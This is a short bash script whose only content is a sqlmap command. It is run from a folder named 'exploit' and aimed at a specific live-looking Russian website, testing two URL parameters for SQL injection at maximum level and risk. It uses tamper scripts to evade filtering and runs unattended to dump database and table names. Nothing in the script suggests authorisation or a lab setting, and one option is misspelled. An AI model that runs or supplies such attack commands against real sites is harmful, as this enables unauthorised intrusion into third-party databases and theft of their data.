#!/bin/bash

python /var/www/exploit/sqlmap/sqlmap.py -u "https://v-govne.ru/?ukey=search&searchstring=22.03.2022" -p ukey,searchstring --dbs --tables --level=5 --risk=3 --threads=10 --time-sec=10 --no-cast --no-escape --tamper="space2comment,between" --batc -v 3
